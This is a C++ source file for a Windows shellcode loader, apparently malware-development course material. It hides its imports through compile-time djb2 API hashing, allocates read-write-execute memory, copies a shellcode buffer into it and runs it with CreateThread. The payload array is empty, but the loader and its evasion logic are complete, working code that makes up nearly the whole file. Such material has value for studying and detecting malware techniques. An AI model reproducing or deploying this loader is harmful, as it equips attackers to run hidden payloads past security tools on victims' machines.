#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

#define SEED 5

constexpr int RandomCompileTimeSeed(void) {
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

// hash a string in djb2
constexpr DWORD HashStringDjb2A(const char* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}

// @NUL0x4C | @mrd0x : MalDevAcademy
// retrieve the address of an exported function or variable from the specified dll
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
	PBYTE pBase = (PBYTE)hModule; // get the base address of the dll module

	// get the DOS header of the dll
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; 
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// get the nt headers of the dll
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// get the optional header of the dll
	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

	// get the export directory of the dll
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// get the arrays of function names, addresses, and ordinals
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	// loop through all functions in the DLL
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		// get the function's name and address
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		// if the hash of the function name matches the given hash, return the function address
		if (dwApiNameHash == HashStringDjb2A((const char*)pFunctionName)) { 
			return (FARPROC)pFunctionAddress;
		}
	}

	return NULL;
}


// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
typedef LPVOID(WINAPI* fnVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

// https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
typedef VOID(WINAPI* fnRtlMoveMemory)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length
	);

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
typedef HANDLE(WINAPI* fnCreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);

// https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
typedef DWORD(WINAPI* fnWaitForSingleObject)(
	HANDLE hHandle, 
	DWORD  dwMilliseconds
	);


unsigned char shellcode[] = "";

int main() {
	// load kernel32
	HMODULE hModuleK32 = LoadLibraryA("kernel32.dll");
	if (hModuleK32 == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return 0;
	}

	// encrypt function names
	constexpr auto VirtualAlloc_Rotr32A = HashStringDjb2A((const char*)"VirtualAlloc");
	fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddressH(hModuleK32, VirtualAlloc_Rotr32A);	 

	constexpr auto RtlMoveMemory_Rotr32A = HashStringDjb2A((const char*)"RtlMoveMemory"); 
	fnRtlMoveMemory pRtlMoveMemory = (fnRtlMoveMemory)GetProcAddressH(hModuleK32, RtlMoveMemory_Rotr32A);

	constexpr auto CreateThread_Rotr32A = HashStringDjb2A((const char*)"CreateThread");
	fnCreateThread pCreateThread = (fnCreateThread)GetProcAddressH(hModuleK32, CreateThread_Rotr32A);

	constexpr auto WaitForSingleObject_Rotr32A = HashStringDjb2A((const char*)"WaitForSingleObject");
	fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)GetProcAddressH(hModuleK32, WaitForSingleObject_Rotr32A); 

	printf("Functions hashed:\n");
	printf("\tVirtualAlloc: 0x%X\n", VirtualAlloc_Rotr32A);
	printf("\tRtlMoveMemory: 0x%X\n", RtlMoveMemory_Rotr32A);
	printf("\tCreateThread: 0x%X\n", CreateThread_Rotr32A);
	printf("\tWaitForSingleObject: 0x%X\n", WaitForSingleObject_Rotr32A);
	system("pause");


	// allocate space in memory
	PVOID pAddr = pVirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Memory allocated at: 0x%llx\n", pAddr);
	system("pause");

	// move shellcode into the allocated space
	pRtlMoveMemory(pAddr, shellcode, sizeof(shellcode));
	printf("Shellcode moved into memory\n");
	printf("Execute?\n");
	system("pause");

	// execute shellcode from space in memory
	HANDLE hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)pAddr, 0, 0, 0); 
	pWaitForSingleObject(hThread, INFINITE); 

	return 0;
}